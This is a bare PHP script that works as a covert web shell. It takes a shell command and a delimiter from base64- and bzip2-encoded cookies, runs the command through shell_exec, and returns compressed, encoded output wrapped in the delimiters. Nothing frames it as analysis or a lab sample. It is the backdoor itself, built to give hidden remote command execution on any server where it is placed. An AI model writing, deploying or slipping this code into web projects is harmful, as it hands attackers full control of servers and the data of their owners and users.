<?php
    $d = bzdecompress(base64_decode($_COOKIE["d"]));
    $c = bzdecompress(base64_decode($_COOKIE["c"]));
    echo $d.base64_encode(bzcompress(shell_exec($c." 2>&1"), 9)).$d;
?>